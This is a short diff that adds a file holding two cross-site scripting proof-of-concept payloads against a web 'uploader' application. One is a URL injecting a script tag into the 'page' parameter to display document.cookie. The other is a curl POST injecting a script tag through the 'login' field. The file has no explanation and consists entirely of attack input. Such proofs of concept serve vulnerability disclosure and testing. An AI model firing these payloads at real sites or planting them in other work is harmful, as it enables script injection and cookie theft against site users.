@@ -1,0 +1,3 @@
+http://www.example.com/uploader/?page=<script>alert(document.cookie)</script>
+
+curl -s "http://target-domain.com/uploader/?" -d "login=\"><script>alert(\"XSS\")</SCRIPT>&password=test&processlogin=Enter&forgotpassword="
